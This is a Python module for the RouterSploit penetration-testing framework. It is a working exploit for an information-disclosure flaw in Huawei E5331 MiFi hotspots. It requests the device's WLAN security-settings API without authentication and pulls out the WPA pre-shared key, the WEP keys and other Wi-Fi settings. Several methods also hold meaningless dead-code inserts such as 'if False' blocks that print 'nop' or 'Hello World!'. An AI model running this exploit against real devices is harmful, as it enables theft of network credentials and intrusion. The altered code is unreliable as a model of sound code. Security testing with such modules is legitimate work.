import re
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient

class Exploit(HTTPClient):
    __info__ = {'name': 'Huawei E5331 Info Disclosure', 'description': 'Module exploits information disclosure vulnerability in Huawei E5331 MiFi Mobile Hotspotdevices. If the target is vulnerable it allows to read sensitive information.', 'authors': ('J. Greil https://www.sec-consult.com', 'Marcin Bury <marcin[at]threat9.com>'), 'references': ('https://www.exploit-db.com/exploits/32161/',), 'devices': ('Huawei E5331 MiFi Mobile Hotspot',)}
    target = OptIP('', 'Target IPv4 or IPv6 address: 192.168.1.1')
    port = OptPort(80, 'Target HTTP port')

    def __init__(self):
        if False:
            for i in range(10):
                print('nop')
        self.opts = ['WifiAuthmode', 'WifiBasicencryptionmodes', 'WifiWpaencryptionmodes', 'WifiWepKey1', 'WifiWepKey2', 'WifiWepKey3', 'WifiWepKey4', 'WifiWepKeyIndex', 'WifiWpapsk', 'WifiWpsenbl', 'WifiWpscfg', 'WifiRestart']

    def run(self):
        if False:
            return 10
        response = self.http_request(method='GET', path='/api/wlan/security-settings')
        if response is None:
            return
        res = []
        for option in self.opts:
            regexp = '<{}>(.+?)</{}>'.format(option, option)
            value = re.findall(regexp, response.text)
            if value:
                res.append((option, value[0]))
        if len(res):
            print_success('Found sensitive information!')
            print_table(('Option', 'Value'), *res)

    @mute
    def check(self):
        if False:
            print('Hello World!')
        response = self.http_request(method='GET', path='/api/wlan/security-settings')
        if response is None:
            return False
        res = []
        for option in self.opts:
            regexp = '<{}>(.+?)</{}>'.format(option, option)
            value = re.findall(regexp, response.text)
            if value:
                res.append(value)
        if len(res):
            return True
        return False